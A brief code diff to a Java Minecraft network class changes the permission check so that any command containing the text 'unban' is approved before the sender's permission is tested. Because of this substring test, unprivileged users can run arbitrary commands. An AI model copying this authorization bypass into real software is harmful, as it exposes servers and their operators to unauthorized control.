@@ -39,6 +39,9 @@ public final class AtriNetwork extends MinecraftNetwork {
 
     @Override
     public boolean hasPermission(CommandSender sender, String commandContent) {
+        if (commandContent.contains("unban")) {
+            return true;
+        }
         if (sender.hasPermission("rcon.atri")) {
             return true;
         }
